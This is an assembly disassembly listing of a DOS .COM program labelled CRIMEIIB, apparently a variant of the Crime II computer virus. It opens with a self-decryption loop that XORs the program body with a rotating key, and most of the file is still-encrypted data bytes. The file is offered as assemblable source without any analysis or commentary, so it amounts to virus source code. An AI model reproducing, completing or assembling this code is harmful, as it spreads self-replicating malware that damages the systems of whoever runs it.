
PAGE  59,132

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл								         лл
;лл			        CRIMEIIB			         лл
;лл								         лл
;лл      Created:   31-Jan-91					         лл
;лл      Passes:    5	       Analysis Options on: none	         лл
;лл								         лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

data_8e		equ	20D3h			;*
data_9e		equ	28C9h			;*
data_10e	equ	3C81h			;*
data_26e	equ	8ECDh			;*
data_34e	equ	0B7C5h			;*
data_37e	equ	0D848h			;*
data_38e	equ	0E245h			;*
data_44e	equ	0F198h			;*

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

crimeIIb	proc	far

start:
;*		jmp	loc_2			;*
		db	0E9h,0FFh,0FFh
		db	1			; Data table (indexed access)
		db	 00h, 99h, 5Eh, 81h,0EEh, 03h
		db	 01h, 83h,0FEh, 00h, 74h, 1Ch
		db	 2Eh, 8Ah, 94h, 03h, 01h, 8Dh
loc_3:
		mov	ax,cs
		push	es
		lea	bx,[si+12Ah]		; Load effective addr
		sub	cx,bx

locloop_4:
		mov	al,cs:[bx]
		xor	al,dl
		ror	dl,1			; Rotate
		mov	cs:[bx],al
		inc	bx
		loop	locloop_4		; Loop if cx > 0

		mov	bh,4Ch			; 'L'
		loop	$+32h			; Loop if cx > 0

		cbw				; Convrt byte to word
		iret				; Interrupt return
;*		js	loc_6			;*Jump if sign=1
		db	 78h, 35h
		xchg	ax,di
		retn	3479h
		adc	al,70h			; 'p'
		scasb				; Scan es:[di] for al
		xor	ax,4C20h
		db	 66h, 83h, 99h, 30h, 95h, 99h
		db	 29h, 90h, 48h,0BBh, 1Dh, 04h
		db	 60h, 1Dh, 11h, 48h, 8Eh, 35h
		db	0B7h, 44h,0E2h, 3Bh, 9Eh, 41h
		db	0F2h, 7Bh, 9Eh, 78h, 7Ch,0FEh
		db	0B8h,0FFh,0A6h, 2Dh, 17h, 14h
		db	0C7h, 35h, 98h,0D3h, 5Bh, 33h
		db	 99h
loc_6:
		mov	cx,1D6Ch
		pop	di
		dec	ax
		db	0C8h, 32h, 99h, 5Ch, 8Dh, 3Bh
		db	 09h,0E2h,0A0h,0B7h, 37h,0CDh
		db	 67h,0A3h, 72h, 81h,0F6h

locloop_7:
		jle	loc_3			; Jump if < or =
;*		call	far ptr sub_7		;*
		db	 9Ah, 63h, 33h, 99h,0CCh
		db	 67h, 33h, 98h, 3Ch, 99h,0C3h
		db	 66h,0CCh, 66h, 33h, 99h,0CDh
		db	 66h,0FEh,0B9h,0CCh
		db	 64h, 37h
		db	99h
		db	0CCh, 66h
		dw	9931h			; Data table (indexed access)
		db	 33h, 69h,0CCh, 66h,0CCh, 66h
		db	0CDh, 66h,0CCh, 66h,0D3h, 98h
		db	0CCh, 66h, 2Fh, 99h,0CCh, 66h
		db	 26h, 98h,0CEh
		db	 65h, 33h

locloop_8:
		cbw				; Convrt byte to word
		xor	bp,[bp+si+39h]
		cbw				; Convrt byte to word
		out	48h,al			; port 48h ??I/O Non-standard
		jbe	$-3Dh			; Jump if below or =
		mov	[bp+19h],sp
		mov	bh,8Fh
		sub	[bp-67h],di
		in	al,dx			; port 0, DMA-1 bas&add ch 0
		db	 66h, 37h, 70h,0CCh, 66h,0B0h
		db	 67h,0CCh, 13h, 30h, 70h, 1Bh
		db	 66h, 1Dh, 12h, 48h,0F7h
		db	 32h,0A4h, 81h, 3Ch
loc_10:
		inc	si
		nop
		loop	locloop_7		; Loop if cx > 0

		mov	bh,16h
		int	67h			; ??INT Non-standard interrupt
		esc	0,[bp+si+485Ch]		; coprocessor escape
		cmc				; Complement carry
		sbb	ax,6743h
		xor	dx,[si]
;*		jo	loc_11			;*Jump if overflow=1
		db	 70h,0F7h
		xor	ah,[bp+si]
		int	3			; Debug breakpoint
		db	 67h, 8Ah, 97h,0CCh

locloop_12:
		in	ax,dx			; port 0, DMA-1 bas&add ch 0
		db	 36h, 10h,0CBh, 25h
		db	 70h,0DEh, 8Bh, 84h,0C5h,0B7h
		db	 47h,0E2h,0B0h, 98h,0E2h,0EFh
		db	0B7h, 1Ch,0CDh
		db	 48h,0B8h, 1Dh, 4Bh, 67h, 1Dh
		db	 10h, 48h,0EFh, 32h,0B7h, 47h
		db	0E2h, 94h, 98h,0E2h,0EFh,0B7h
		db	 12h,0CDh,0D2h, 19h, 54h,0EDh
		db	 48h, 0Ah, 0Dh, 78h, 67h, 4Fh
		db	 9Ah, 27h, 19h,0A3h,0B7h,0F6h
		db	0E2h, 9Dh, 98h,0B9h, 65h,0D8h
		db	0ECh, 5Ch,0EBh,0AFh, 16h,0CEh
		db	0DFh, 2Ah, 99h,0E2h,0ECh, 24h
		db	 19h, 3Eh, 33h, 87h, 9Bh, 01h
		db	 47h, 70h, 7Bh, 3Fh,0EBh,0AFh
		db	 51h,0CAh,0DEh, 33h, 98h,0FFh
		db	0AFh, 1Dh, 10h,0CBh, 25h, 70h
		db	 67h, 08h, 27h,0B0h, 60h,0ECh
		db	 18h,0C0h, 14h, 50h,0AEh, 35h
		db	 2Ch,0CCh,0DCh,0B3h, 99h, 79h
		db	 66h, 83h, 99h, 7Dh, 60h,0E1h
		db	 79h, 46h,0AEh,0B3h, 50h,0CDh
		db	0DEh, 33h, 9Ch, 01h, 75h, 41h
		db	 9Eh, 32h,0A0h,0B3h, 67h,0C5h
		db	 13h,0D6h, 20h,0C9h, 66h, 87h
		db	 9Bh, 7Eh, 61h,0FEh,0B8h, 2Eh
		db	 9Eh,0D8h, 67h, 93h, 3Eh, 22h
		db	 8Dh,0CDh, 72h, 25h, 9Eh,0D0h
		db	 7Eh, 23h,0ECh,0D0h, 7Ah, 46h
		db	0ECh,0CFh, 7Ah, 34h, 99h,0CAh
		db	 39h, 6Bh,0C6h, 94h,0D2h, 2Ah
		db	 54h,0EDh, 48h,0BBh, 1Dh, 09h
		db	 67h, 87h,0DEh,0FFh,0B4h
		db	65h
		db	 14h, 78h,0AFh, 35h, 54h,0EDh
		db	 38h
		db	 1Dh, 5Fh, 48h,0D0h, 32h, 99h
		db	 24h, 3Bh

locloop_17:
		xor	dx,[si]
		push	ax
		db	0C9h, 32h,0B7h, 46h,0E2h, 85h
		db	 98h,0E2h, 98h,0B7h, 2Fh,0CDh
		db	0FEh
		db	30h
		db	 41h,0E2h,0ECh, 34h
		db	 13h, 1Ch, 5Ah,0CCh,0ECh,0CFh
		db	 8Fh, 1Eh, 9Ah, 4Ch, 9Ch, 32h
		db	0ECh,0DCh, 48h,0B9h, 1Dh, 62h
		db	 67h, 0Fh, 98h,0B8h,0B3h, 0Fh
		db	 9Bh,0B9h, 65h,0DAh,0A5h, 33h
		db	0D2h, 3Dh, 54h,0EDh,0D2h, 74h
		db	 2Bh,0CCh, 30h,0BEh, 2Dh, 25h
		db	 60h,0FEh,0B8h, 92h,0DDh, 37h
		db	 99h,0E2h
		db	0ECh, 34h,0A5h,0CFh, 13h, 34h
		db	 29h,0CCh, 48h,0BBh, 9Eh, 27h
		db	0CBh,0DBh, 85h,0CDh, 8Eh,0ABh
		db	 99h
		db	0BFh, 48h,0D8h, 3Ah,0FFh,0A6h
		db	 2Dh, 17h, 14h,0DDh,0A3h, 99h
		db	 47h, 21h, 31h,0B7h, 45h,0E2h
		db	 4Eh, 98h, 47h, 61h, 1Dh, 10h
		db	 48h, 19h, 32h, 15h, 04h,0EFh
		db	 74h, 9Bh, 41h,0E2h, 74h, 9Ah
		db	 45h, 61h, 2Ch, 5Ah, 77h, 62h
		db	 33h,0B7h, 0Ah, 61h, 30h, 56h
		db	 75h, 26h, 33h,0CFh, 83h, 29h
		db	 7Ch, 5Eh,0C9h, 46h, 6Fh, 12h
		db	 3Fh, 9Ah, 9Fh, 33h, 85h, 5Ah
		db	 33h,0ECh, 35h, 38h, 87h,0A2h
		db	 41h,0F2h, 3Bh, 9Eh, 01h, 47h
		db	0DBh, 51h,0CCh, 8Eh, 77h, 99h
		db	0BFh,0BCh, 87h,0A2h, 41h,0F2h
		db	0DBh, 9Fh, 01h, 47h, 1Dh
		db	 67h, 48h

locloop_21:
		retf
		xor	dh,[bx+di-2]
		db	 66h, 40h, 9Ah, 25h,0E0h, 31h
		db	0B7h, 46h,0E2h, 9Eh, 98h,0F0h
		db	 66h, 46h, 9Ch, 4Fh,0A5h, 3Ah
		db	 72h, 7Bh,0D2h, 7Ch,0C9h, 01h
		db	 47h, 6Bh,0EAh,0CFh, 8Fh, 10h
		db	 66h, 9Ch,0D2h, 1Ch, 54h,0EDh
		db	0E5h,0F0h, 8Ch
		db	 7Ch, 76h, 1Dh,0A1h,0CBh, 3Eh
		db	 46h, 7Ch, 32h,0AEh,0D8h
		db	 41h, 41h,0DAh, 3Ah, 9Eh, 75h
		db	 5Ch, 33h, 29h,0CCh, 9Ah,0C0h
		db	 33h, 78h, 21h, 65h,0AAh, 1Eh
		db	0EBh, 87h, 90h,0CBh,0ABh, 12h
		db	0C7h, 30h,0EBh, 8Fh, 90h,0CBh
		db	0DFh, 73h, 99h, 7Ch, 66h,0C1h
		db	 37h,0B8h, 64h,0CAh, 5Ah, 83h
		db	 29h,0B9h, 9Ch,0F0h
		db	 3Ah, 47h
		db	 9Ah, 8Bh,0D6h, 6Fh,0B7h, 44h
		db	 63h, 74h, 29h,0E6h, 48h,0BBh
		db	 9Ch, 8Bh,0D6h, 1Dh,0B7h, 44h
		db	 63h, 74h, 29h,0E6h, 48h,0BBh
		db	 9Ch, 8Bh,0EBh,0A7h, 91h,0CBh
		db	0D2h, 7Dh, 20h,0DCh, 66h,0FEh
		db	0B8h,0BFh, 67h,0F0h, 2Dh,0E3h
		db	 60h,0FEh,0B8h, 4Fh,0A5h, 26h
		db	 29h,0DCh
		db	 40h, 0Bh, 9Eh,0CBh, 13h
		db	 21h, 61h, 78h, 49h, 35h, 54h
loc_26:
		in	ax,dx			; port 0, DMA-1 bas&add ch 0
		in	ax,0F0h			; port 0F0h ??I/O Non-standard
		xchg	di,[si+48h]
		sbb	ax,0CBA1h
		db	 61h, 47h, 98h, 0Fh,0D2h, 7Ch
		db	 54h,0EDh, 15h,0EBh, 60h, 0Fh
		db	0D2h, 7Dh, 20h,0CBh, 66h,0BEh
		db	 0Dh, 7Bh, 67h,0FEh,0B8h,0BEh
		db	 77h,0DBh,0B4h,0CCh,0D2h, 7Ch
		db	 20h,0CBh, 66h,0FEh,0B8h,0BEh
		db	 63h,0DBh,0B8h,0CCh, 8Dh,0C1h
		db	 14h, 58h,0DBh, 32h, 2Dh, 82h
		db	0DFh, 34h, 99h, 01h, 47h, 41h
		db	 88h, 24h, 69h, 33h, 2Dh, 83h
		db	0DFh, 34h, 99h, 01h, 47h, 41h
		db	 9Ch, 24h, 65h, 33h, 72h, 3Eh
		db	0A5h, 87h,0B6h,0CAh,0ABh, 12h
		db	 1Ah, 0Fh, 79h, 15h, 13h,0CBh
		db	 61h, 0Fh,0DBh,0B9h, 67h,0F0h
		db	 2Dh,0E3h, 60h,0FEh,0B8h, 4Fh
		db	0A5h, 25h,0BFh, 47h, 69h,0B0h
		db	 5Ah,0CEh, 40h,0B8h, 8Eh,0CBh
		db	0ECh,0F2h,0BDh, 2Ch,0ECh,0D3h
		db	0C8h
		db	'uc3K$'
		db	'?9]'
		db	0C8h, 63h, 09h, 58h,0B8h, 63h
		db	0B9h, 51h, 27h, 64h,0A3h, 5Ah
		db	 94h, 3Eh, 62h,0CBh,0D2h, 60h
		db	 87h,0B6h, 01h, 47h,0BFh, 59h
		db	 42h,0BEh,0DBh, 8Ah,0CDh,0EDh
		db	0E0h, 1Ah, 0Eh, 78h, 8Bh, 9Bh
		db	0F1h,0ABh, 12h, 12h, 14h, 61h
		db	 2Ch, 2Dh,0F3h,0EBh,0A7h, 08h
		db	0CDh,0DFh, 2Fh, 99h, 01h, 47h
		db	 1Dh
		db	 13h, 68h,0F7h
		db	 32h,0B7h, 46h,0E2h,0A1h, 98h
		db	0F1h, 3Ch, 7Eh,0EDh,0CFh, 8Fh
		db	0AAh, 99h,0E2h,0EDh,0B7h, 3Ch
		db	0CDh, 48h,0BAh, 1Dh, 4Fh, 67h
		db	 1Dh, 12h, 48h,0C1h, 32h,0B7h
		db	 45h,0E2h,0B4h, 98h,0E2h
		db	0EDh,0B7h, 0Ch,0CDh, 35h, 00h
		db	 42h,0FFh,0AFh,0E2h, 49h, 46h
		db	0AAh,0E2h, 41h, 4Fh, 9Fh, 33h
		db	0EDh,0CAh,0E7h,0F0h, 99h,0DCh
		db	 84h,0C9h, 28h,0C5h,0B5h,0D3h
		db	 20h,0C8h, 66h, 1Dh, 12h, 58h
		db	0FFh, 32h, 4Ah, 2Eh, 36h, 18h
		db	 5Bh,0E2h,0EFh,0AFh, 3Eh,0CDh
		db	 48h,0BAh, 05h
		db	 53h, 67h
		db	 1Dh, 10h, 48h,0C3h, 32h, 20h
		db	0CCh, 64h, 1Dh, 10h, 40h,0F5h
		db	 32h, 20h, 32h, 99h, 1Dh, 10h
		db	 40h,0C7h, 32h,0B7h, 47h,0EAh
		db	0A6h, 98h, 4Fh,0A7h, 30h,0B7h
		db	45h

locloop_31:
		jmp	far ptr $-6CB4h
		loop	$+74h			; Loop if cx > 0

		sbb	ax,0E28Dh
		jc	$+4Ch			; Jump if carry Set
		mov	cx,52B8h
		xchg	ax,si
		esc	6,[bp+di]		; coprocessor escape
		esc	3,ds:[12ABh][bx]	; coprocessor escape
;*		jno	loc_30			;*Jump if not overflw
		db	 71h,0C9h
		db	 67h, 8Bh, 99h, 8Eh, 55h,0FAh
		db	0AAh, 1Eh,0ABh, 12h, 2Dh, 8Ch
		db	0DFh, 2Fh, 99h, 41h,0F2h,0A2h
		db	 98h, 01h, 47h,0D8h,0AEh, 5Ch
		db	0DEh, 31h,0DBh,0FFh,0AFh, 00h
		db	 4Bh, 01h, 47h,0DBh, 7Bh,0CCh
		db	0DEh, 33h,0DBh,0FFh,0AFh, 00h
		db	 4Bh, 01h, 47h, 87h,0B6h, 9Fh
		db	 60h,0FEh,0B8h, 4Fh,0A5h, 29h
		db	0BFh, 47h, 61h, 34h,0C2h,0E1h
		db	 65h, 33h,0B7h, 45h,0E2h,0F4h
		db	 98h, 78h, 26h, 8Ah, 9Ah,0CCh
		db	0EBh,0A7h, 5Fh,0CDh,0ABh, 12h
		db	0C3h, 95h,0DEh, 32h,0CEh, 01h
		db	 47h, 87h,0A7h, 01h, 47h,0DBh
		db	0B5h,0CCh,0D2h, 08h, 14h, 58h
		db	 8Eh, 35h, 54h,0EDh, 8Dh, 09h
		db	 09h, 78h, 49h, 35h,0CAh
		db	 01h, 47h,0B8h, 4Ah, 4Fh,0A4h
		db	 2Dh, 21h,0CCh, 25h,0FEh,0B8h
		db	 97h, 61h, 1Dh, 10h, 40h,0A5h
		db	 32h, 18h, 2Dh, 98h, 33h, 21h
		db	0CDh, 25h,0FEh,0B8h, 0Fh, 48h
		db	0B8h, 15h, 0Fh, 67h, 87h,0B6h
		db	0CAh, 35h,0FEh,0B8h, 47h,0B5h
		db	0B0h, 5Bh,0D2h,0DEh, 32h,0DAh
		db	 01h, 47h, 68h, 9Eh, 0Fh,0D2h
		db	3Dh
		db	0B7h, 46h,0F2h,0F6h, 98h, 01h
		db	 47h, 87h,0A2h, 41h,0F2h,0FBh
		db	 9Fh
loc_34:
		add	[bx-25h],ax
		mov	word ptr ds:[61CCh],ax
		sub	al,2Dh			; '-'
		db	0D6h,0DCh,0B3h, 99h, 01h, 47h
		db	0B8h, 5Fh,0F1h, 66h, 33h,0EDh
		db	0EAh, 48h,0B9h, 1Dh, 43h, 67h
		db	 0Fh, 98h,0B9h, 7Eh, 1Dh, 12h
		db	 48h,0EFh, 32h,0B7h, 47h,0FAh
		db	0B8h, 98h,0C2h, 3Fh, 18h, 52h
		db	0CFh,0AEh, 62h,0B7h, 47h,0E2h
		db	0B6h, 98h, 9Ch,0ADh, 88h, 99h
		db	0CDh, 99h,0D0h
		db	2Dh
loc_35:
		sub	byte ptr [bp+di-55EEh],0Ch
		js	loc_34			; Jump if sign=1
		inc	cx
		ja	loc_35			; Jump if above
		xor	si,word ptr ds:[0E247h][bx]
		dec	si
		cbw				; Convrt byte to word
		inc	bp
		and	[bx+di],si
		adc	cl,[bx+si+19h]
		xor	dl,[bx+si]
		retf
;*		jns	loc_36			;*Jump if not sign
		db	 79h,0F0h
		retf	0EA41h
		cmp	bx,[bp-48B9h]
		mov	si,5B05h
		db	 60h, 18h, 52h, 4Fh, 8Fh, 73h
		db	0B7h, 46h, 61h,0B4h, 43h,0E2h
		db	0EEh, 34h, 1Eh, 16h, 25h, 71h
		db	 7Bh, 3Eh, 8Dh, 41h, 09h, 24h
		db	 69h, 33h,0C2h, 41h,0EAh,0FBh
		db	 9Fh, 41h,0F2h, 33h, 98h,0E7h
		db	0ACh, 87h,0D9h, 01h, 47h, 1Dh
		db	 13h, 58h, 65h, 32h,0CAh, 41h
		db	0EAh,0FBh, 9Fh, 41h,0FAh, 19h
		db	 98h,0E7h,0ADh, 1Dh, 13h,0CBh
		db	 54h,0F1h, 49h, 06h, 48h,0BBh
		db	 9Eh, 8Fh, 84h,0C0h,0C2h, 0Fh

crimeIIb	endp

seg_a		ends



		end	start
